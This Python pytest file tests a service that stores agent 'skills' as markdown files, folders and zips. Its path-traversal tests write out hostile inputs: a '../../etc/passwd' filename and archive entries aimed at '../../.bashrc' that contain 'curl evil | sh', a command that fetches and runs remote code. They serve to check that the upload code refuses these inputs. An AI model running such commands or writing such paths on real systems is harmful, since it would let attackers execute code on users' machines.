"""Skills an agent can be given."""

from __future__ import annotations

import base64
import hashlib
from collections.abc import AsyncIterator
from pathlib import Path
from uuid import UUID

import pytest
from httpx import AsyncClient
from sqlalchemy import func, select
from sqlalchemy.exc import IntegrityError
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings
from app.db import Database
from app.models import Blob, Skill
from tests.conftest import client_for, sign_in
from tests.test_skill_folders import zipped

ATLAS = {"key": "ATL", "name": "Atlas Billing Migration"}
HERMES = {"key": "HRM", "name": "Hermes Notifications"}
UPLOADER = {
    "name": "Aditi K",
    "kind": "team",
    "title": "Backend engineer",
    "responsibilities": "Payments and webhooks.",
}
UNKNOWN_ID = "00000000-0000-7000-8000-000000000000"


def content_of(label: str) -> bytes:
    """Bytes unique to one test.

    The store is content-addressed and the data directory outlives a single
    test, so two tests uploading the same skill would be looking at one blob.
    """
    return f"---\nname: {label}\n---\n\nDo the thing.\n".encode() * 4


def blob_path(settings: Settings, content: bytes) -> Path:
    """Where the store would put this content, whether or not it is there."""
    digest = hashlib.sha256(content).hexdigest()
    return settings.blob_dir / digest[0:2] / digest[2:4] / digest


SETUP_SCRIPT = b"#!/bin/sh\necho set the machine up\n"
LOGO = b"\x89PNG\r\n\x1a\n\x00\xff" + b"folder-logo" * 8


def folder_of(label: str) -> dict[str, bytes]:
    """A skill that is a folder: a SKILL.md, a script, and something binary."""
    return {
        f"{label}/SKILL.md": f"---\nname: {label}\n---\n\nRun scripts/setup.sh.\n".encode(),
        f"{label}/scripts/setup.sh": SETUP_SCRIPT,
        f"{label}/reference/logo.png": LOGO,
    }


async def upload_folder(
    client: AsyncClient,
    label: str,
    files: dict[str, bytes],
    *,
    project_key: str = "ATL",
    **form: str,
) -> tuple[int, dict]:
    """Post a folder the way a directory picker does: one part per file."""
    response = await client.post(
        f"/projects/{project_key}/skills",
        files=[("file", (path, data, "application/octet-stream")) for path, data in files.items()],
        data={"folder": label, **form},
    )
    assert response.status_code in {200, 201}, response.text
    return response.status_code, response.json()


@pytest.fixture
async def project(signed_in: AsyncClient) -> AsyncClient:
    """A signed-in client with one project to hang skills off."""
    await signed_in.post("/projects", json=ATLAS)
    return signed_in


@pytest.fixture
async def capped(
    settings: Settings, database: Database, tmp_path: Path
) -> AsyncIterator[AsyncClient]:
    """A client whose app refuses anything over a megabyte."""
    limited = settings.model_copy(update={"max_upload_mb": 1, "data_dir": tmp_path})
    async with client_for(limited, database) as http:
        await sign_in(http)
        await http.post("/projects", json=ATLAS)
        yield http


async def upload(
    client: AsyncClient,
    name: str,
    content: bytes,
    *,
    project_key: str = "ATL",
    **form: str,
) -> dict:
    response = await client.post(
        f"/projects/{project_key}/skills",
        files={"file": (name, content, "text/markdown")},
        data=form,
    )
    assert response.status_code in {200, 201}, response.text
    return response.json()


class TestUploadingSkills:
    async def test_stores_one(self, project: AsyncClient) -> None:
        content = content_of("board-tidy")

        response = await project.post(
            "/projects/ATL/skills",
            files={"file": ("board-tidy.md", content, "text/markdown")},
            data={"description": "Move stale cards back to triage."},
        )

        assert response.status_code == 201
        body = response.json()
        assert body["name"] == "board-tidy.md"
        assert body["description"] == "Move stale cards back to triage."
        assert body["size"] == len(content)
        assert body["mime"] == "text/markdown"
        assert body["added_by"] is None

    async def test_writes_the_bytes_where_they_can_be_downloaded(
        self, project: AsyncClient, settings: Settings
    ) -> None:
        content = content_of("day-report")
        skill = await upload(project, "day-report.md", content)

        assert blob_path(settings, content).exists()
        download = await project.get(f"/skills/{skill['id']}/download")
        assert download.status_code == 200
        assert download.content == content

    async def test_lists_them_by_name(self, project: AsyncClient) -> None:
        await upload(project, "triage.md", content_of("triage"))
        await upload(project, "archive.md", content_of("archive"))

        listing = (await project.get("/projects/ATL/skills")).json()

        assert [skill["name"] for skill in listing] == ["archive.md", "triage.md"]

    async def test_records_who_uploaded_it(self, project: AsyncClient) -> None:
        person = (await project.post("/people", json=UPLOADER)).json()["id"]

        skill = await upload(project, "triage.md", content_of("uploader"), added_by=person)

        assert skill["added_by"]["name"] == "Aditi K"

    async def test_refuses_an_uploader_who_is_not_in_the_directory(
        self, project: AsyncClient
    ) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files={"file": ("triage.md", content_of("nobody"), "text/markdown")},
            data={"added_by": UNKNOWN_ID},
        )

        assert response.status_code == 422

    async def test_refuses_an_upload_with_no_usable_filename(self, project: AsyncClient) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files={"file": ("../../etc/passwd", b"root:x:0:0", "text/plain")},
        )

        # The directory part is stripped, so this lands as "passwd" rather than
        # being refused — what matters is that it is not a path.
        assert response.status_code == 201
        assert response.json()["name"] == "passwd"

    async def test_refuses_anything_over_the_cap(self, capped: AsyncClient, tmp_path: Path) -> None:
        response = await capped.post(
            "/projects/ATL/skills",
            files={"file": ("huge.md", b"x" * (2 << 20), "text/markdown")},
        )

        assert response.status_code == 413
        assert not list((tmp_path / "blobs").rglob("*")), "a refused upload leaves nothing on disk"
        assert (await capped.get("/projects/ATL/skills")).json() == []


class TestReplacingASkill:
    """The name is the skill, so uploading it again is a new version of it."""

    async def test_replaces_rather_than_conflicting(self, project: AsyncClient) -> None:
        first = await upload(project, "triage.md", content_of("v1"))
        second = content_of("v2")

        response = await project.post(
            "/projects/ATL/skills",
            files={"file": ("triage.md", second, "text/markdown")},
        )

        assert response.status_code == 200, "a second upload of a name is a new version"
        assert response.json()["id"] == first["id"], "the same skill, not another one"
        assert response.json()["size"] == len(second)

    async def test_leaves_one_row_behind(self, project: AsyncClient, session: AsyncSession) -> None:
        await upload(project, "triage.md", content_of("only-v1"))
        await upload(project, "triage.md", content_of("only-v2"))

        count = await session.scalar(select(func.count()).select_from(Skill))

        assert count == 1

    async def test_serves_the_new_content(self, project: AsyncClient) -> None:
        skill = await upload(project, "triage.md", content_of("old"))
        new = content_of("new")
        await upload(project, "triage.md", new)

        download = await project.get(f"/skills/{skill['id']}/download")

        assert download.content == new

    async def test_collects_the_content_it_replaced(
        self, project: AsyncClient, settings: Settings
    ) -> None:
        old = content_of("superseded")
        await upload(project, "triage.md", old)
        assert blob_path(settings, old).exists()

        await upload(project, "triage.md", content_of("successor"))

        assert not blob_path(settings, old).exists(), "nothing points at the old bytes"

    async def test_re_uploading_identical_bytes_keeps_them(
        self, project: AsyncClient, settings: Settings
    ) -> None:
        """The replacement can be the very blob being swept for."""
        same = content_of("unchanged")
        skill = await upload(project, "triage.md", same)

        again = await upload(project, "triage.md", same)

        assert again["id"] == skill["id"]
        assert blob_path(settings, same).exists(), "the row points at these bytes now"
        download = await project.get(f"/skills/{skill['id']}/download")
        assert download.content == same

    async def test_keeps_the_description_when_none_is_sent(self, project: AsyncClient) -> None:
        await upload(project, "triage.md", content_of("described"), description="Tidy the board.")

        again = await upload(project, "triage.md", content_of("redescribed"))

        assert again["description"] == "Tidy the board."

    async def test_a_name_is_only_taken_within_its_project(self, project: AsyncClient) -> None:
        await project.post("/projects", json=HERMES)
        await upload(project, "triage.md", content_of("atlas-triage"))

        elsewhere = await upload(
            project, "triage.md", content_of("hermes-triage"), project_key="HRM"
        )

        assert elsewhere["project_id"] != (await project.get("/projects/ATL")).json()["id"]

    async def test_the_database_refuses_a_duplicate_name(
        self, project: AsyncClient, session: AsyncSession
    ) -> None:
        """The uniqueness is an index, not a convention the service remembers."""
        uploaded = await upload(project, "triage.md", content_of("the-real-one"))
        blob_id = await session.scalar(
            select(Skill.blob_id).where(Skill.id == UUID(uploaded["id"]))
        )

        session.add(
            Skill(
                project_id=UUID(uploaded["project_id"]),
                name="triage.md",
                blob_id=blob_id,
                mime="text/markdown",
            )
        )

        with pytest.raises(IntegrityError):
            await session.flush()
        await session.rollback()


class TestSkillsShareContentWithFiles:
    """A skill and a file holding the same bytes cost one copy on disk."""

    async def test_deleting_a_skill_keeps_bytes_a_file_still_uses(
        self, project: AsyncClient, settings: Settings, session: AsyncSession
    ) -> None:
        shared = content_of("shared-with-a-file")
        root = (await project.get("/projects/ATL/folders")).json()[0]["id"]
        await project.post(
            f"/folders/{root}/upload",
            files={"file": ("brief.md", shared, "text/markdown")},
        )
        skill = await upload(project, "brief.md", shared)
        assert await session.scalar(select(func.count()).select_from(Blob)) == 1, "one blob"

        assert (await project.delete(f"/skills/{skill['id']}")).status_code == 200

        assert blob_path(settings, shared).exists(), "the file still points at these bytes"

    async def test_deleting_a_file_keeps_bytes_a_skill_still_uses(
        self, project: AsyncClient, settings: Settings
    ) -> None:
        """The regression the shared blob module exists to prevent."""
        shared = content_of("shared-with-a-skill")
        root = (await project.get("/projects/ATL/folders")).json()[0]["id"]
        item = (
            await project.post(
                f"/folders/{root}/upload",
                files={"file": ("brief.md", shared, "text/markdown")},
            )
        ).json()
        await upload(project, "brief.md", shared)

        response = await project.delete(f"/items/{item['id']}")

        assert response.status_code == 200, response.text
        assert blob_path(settings, shared).exists(), "the skill still points at these bytes"


class TestRemovingSkills:
    async def test_deletes_one(self, project: AsyncClient) -> None:
        skill = await upload(project, "triage.md", content_of("doomed"))

        assert (await project.delete(f"/skills/{skill['id']}")).status_code == 200

        assert (await project.get(f"/skills/{skill['id']}")).status_code == 404
        assert (await project.get("/projects/ATL/skills")).json() == []

    async def test_takes_its_content_with_it(
        self, project: AsyncClient, settings: Settings
    ) -> None:
        content = content_of("doomed-content")
        skill = await upload(project, "triage.md", content)

        await project.delete(f"/skills/{skill['id']}")

        assert not blob_path(settings, content).exists()

    async def test_describes_one_without_re_uploading(self, project: AsyncClient) -> None:
        skill = await upload(project, "triage.md", content_of("undescribed"))

        response = await project.patch(
            f"/skills/{skill['id']}", json={"description": "Tidy the board."}
        )

        assert response.status_code == 200
        assert response.json()["description"] == "Tidy the board."


class TestASkillAsAFolder:
    """`/folder` is the skill laid out for `.claude/skills/`, whatever it was uploaded as."""

    async def test_lays_out_a_markdown_skill(self, project: AsyncClient) -> None:
        skill = await upload(
            project, "Board Tidy.md", b"# Tidy\n\nDo it.\n", description="Move stale cards."
        )

        response = await project.get(f"/skills/{skill['id']}/folder")

        assert response.status_code == 200
        body = response.json()
        assert body["skill"]["id"] == skill["id"]
        assert body["folder"] == "board-tidy"
        text = (
            '---\nname: "board-tidy"\ndescription: "Move stale cards."\n---\n\n# Tidy\n\nDo it.\n'
        )
        assert body["files"] == [
            {
                "path": "SKILL.md",
                "encoding": "utf-8",
                "content": text,
                "size": len(text.encode()),
                "executable": False,
            }
        ]

    async def test_unpacks_a_zipped_one(self, project: AsyncClient) -> None:
        image = b"\x89PNG\r\n\x1a\n\x00\xff" + content_of("zip-image")
        content = zipped(
            {
                "cylist/SKILL.md": b"---\nname: cylist\ndescription: Set up.\n---\nRun it.\n",
                "cylist/setup.sh": b"#!/bin/sh\necho set up\n",
                "cylist/logo.png": image,
            },
            modes={"cylist/setup.sh": 0o100755},
        )
        response = await project.post(
            "/projects/ATL/skills", files={"file": ("cylist.zip", content, "application/zip")}
        )
        skill = response.json()

        body = (await project.get(f"/skills/{skill['id']}/folder")).json()

        assert body["folder"] == "cylist"
        files = {one["path"]: one for one in body["files"]}
        assert list(files) == ["SKILL.md", "logo.png", "setup.sh"]
        assert files["setup.sh"]["executable"] is True
        assert files["logo.png"]["encoding"] == "base64"
        assert base64.b64decode(files["logo.png"]["content"]) == image

    async def test_refuses_a_zip_it_cannot_install_and_says_why(self, project: AsyncClient) -> None:
        content = zipped({"SKILL.md": b"Do it.\n", "../../.bashrc": b"curl evil | sh\n"})
        response = await project.post(
            "/projects/ATL/skills", files={"file": ("evil.zip", content, "application/zip")}
        )
        skill = response.json()

        refused = await project.get(f"/skills/{skill['id']}/folder")

        assert refused.status_code == 422
        assert "points outside the skill's folder" in refused.json()["error"]["message"]
        download = await project.get(f"/skills/{skill['id']}/download")
        assert download.content == content, "the upload itself is still there, as it was"

    async def test_is_404_for_a_skill_that_is_not_there(self, project: AsyncClient) -> None:
        assert (await project.get(f"/skills/{UNKNOWN_ID}/folder")).status_code == 404


class TestUploadingAFolder:
    """A skill is usually a SKILL.md and the files it points at, picked together."""

    async def test_stores_the_whole_folder_as_one_skill(self, project: AsyncClient) -> None:
        code, skill = await upload_folder(
            project, "cylist-kit", folder_of("cylist-kit"), description="Set a machine up."
        )

        assert code == 201
        assert skill["name"] == "cylist-kit.zip", "one skill, named after the folder"
        assert skill["mime"] == "application/zip"
        assert skill["description"] == "Set a machine up."
        assert [one["name"] for one in (await project.get("/projects/ATL/skills")).json()] == [
            "cylist-kit.zip"
        ]

    async def test_gives_every_file_back_byte_for_byte(self, project: AsyncClient) -> None:
        _, skill = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))

        body = (await project.get(f"/skills/{skill['id']}/folder")).json()

        assert body["folder"] == "cylist-kit"
        files = {one["path"]: one for one in body["files"]}
        assert list(files) == ["SKILL.md", "reference/logo.png", "scripts/setup.sh"]
        assert files["SKILL.md"]["content"].endswith("Run scripts/setup.sh.\n")
        assert files["scripts/setup.sh"]["content"] == SETUP_SCRIPT.decode()
        assert base64.b64decode(files["reference/logo.png"]["content"]) == LOGO

    async def test_downloads_as_a_zip_that_uploads_again_unchanged(
        self, project: AsyncClient
    ) -> None:
        _, skill = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
        download = await project.get(f"/skills/{skill['id']}/download")
        before = (await project.get(f"/skills/{skill['id']}/folder")).json()["files"]

        again = await project.post(
            "/projects/ATL/skills",
            files={"file": ("cylist-kit.zip", download.content, "application/zip")},
        )

        assert download.status_code == 200
        assert again.status_code == 200, "same name, so it replaced itself"
        assert again.json()["id"] == skill["id"]
        after = (await project.get(f"/skills/{skill['id']}/folder")).json()["files"]
        assert after == before, "what was downloaded is what can be uploaded"

    async def test_the_same_folder_twice_costs_one_blob(
        self, project: AsyncClient, session: AsyncSession
    ) -> None:
        before = await session.scalar(select(func.count()).select_from(Blob))

        await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
        code, _ = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))

        assert code == 200, "the name is the skill, so the second is a replacement"
        after = await session.scalar(select(func.count()).select_from(Blob))
        assert after == (before or 0) + 1, "packed the same way both times"

    async def test_replacing_a_folder_drops_a_file_that_went(self, project: AsyncClient) -> None:
        await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))

        _, skill = await upload_folder(
            project,
            "cylist-kit",
            {"cylist-kit/SKILL.md": b"---\nname: cylist-kit\n---\n\nNothing else now.\n"},
        )

        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
        assert [one["path"] for one in body["files"]] == ["SKILL.md"]

    async def test_marks_the_parts_the_uploader_said_are_executable(
        self, project: AsyncClient
    ) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files=[
                ("file", (path, data, "application/octet-stream"))
                for path, data in folder_of("cylist-kit").items()
            ],
            data={"folder": "cylist-kit", "executable": "cylist-kit/scripts/setup.sh"},
        )

        body = (await project.get(f"/skills/{response.json()['id']}/folder")).json()
        marked = {one["path"]: one["executable"] for one in body["files"]}
        assert marked == {
            "SKILL.md": False,
            "reference/logo.png": False,
            "scripts/setup.sh": True,
        }

    async def test_takes_a_folder_holding_only_a_skill_md(self, project: AsyncClient) -> None:
        _, skill = await upload_folder(
            project, "day-report", {"day-report/SKILL.md": b"Write the day up.\n"}
        )

        assert skill["name"] == "day-report.zip", "one part, but a folder was named"
        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
        assert body["folder"] == "day-report"

    async def test_refuses_a_folder_with_no_skill_md(self, project: AsyncClient) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files=[("file", ("kit/README.md", b"Nothing here.\n", "text/markdown"))],
            data={"folder": "kit"},
        )

        assert response.status_code == 422
        assert "no SKILL.md at its root" in response.json()["error"]["message"]
        assert (await project.get("/projects/ATL/skills")).json() == [], "and nothing was stored"

    async def test_refuses_a_part_that_points_outside_the_folder(
        self, project: AsyncClient
    ) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files=[
                ("file", ("kit/SKILL.md", b"Do it.\n", "text/markdown")),
                ("file", ("kit/../../.bashrc", b"curl evil | sh\n", "text/plain")),
            ],
            data={"folder": "kit"},
        )

        assert response.status_code == 422
        assert "points outside the skill's folder" in response.json()["error"]["message"]

    async def test_refuses_a_folder_over_the_cap(self, capped: AsyncClient) -> None:
        response = await capped.post(
            "/projects/ATL/skills",
            files=[
                ("file", ("kit/SKILL.md", b"Do it.\n", "text/markdown")),
                ("file", ("kit/big.bin", b"x" * (2 << 20), "application/octet-stream")),
            ],
            data={"folder": "kit"},
        )

        assert response.status_code == 413
        assert (await capped.get("/projects/ATL/skills")).json() == []


class TestASingleFileSkillIsUnchanged:
    """A folder is the new way in, not the only one."""

    async def test_is_stored_as_the_file_it_was_sent_as(self, project: AsyncClient) -> None:
        content = content_of("still-markdown")

        skill = await upload(project, "board-tidy.md", content)

        assert skill["name"] == "board-tidy.md", "not board-tidy.zip"
        assert skill["mime"] == "text/markdown"
        download = await project.get(f"/skills/{skill['id']}/download")
        assert download.content == content, "the markdown itself, not a zip of it"

    async def test_still_strips_a_directory_off_a_lone_filename(self, project: AsyncClient) -> None:
        response = await project.post(
            "/projects/ATL/skills",
            files={"file": ("../../etc/passwd", b"root:x:0:0", "text/plain")},
        )

        assert response.status_code == 201
        assert response.json()["name"] == "passwd", "one part and no folder is one file"


class TestTheHubCounts:
    async def test_reports_skills(self, project: AsyncClient) -> None:
        await upload(project, "triage.md", content_of("counted"))

        summary = (await project.get("/projects/ATL/summary")).json()

        assert summary["skill_count"] == 1
        assert "agent_note_count" not in summary, "the scratchpad is retired"

    async def test_reports_nothing_on_an_empty_project(self, project: AsyncClient) -> None:
        summary = (await project.get("/projects/ATL/summary")).json()

        assert summary["skill_count"] == 0
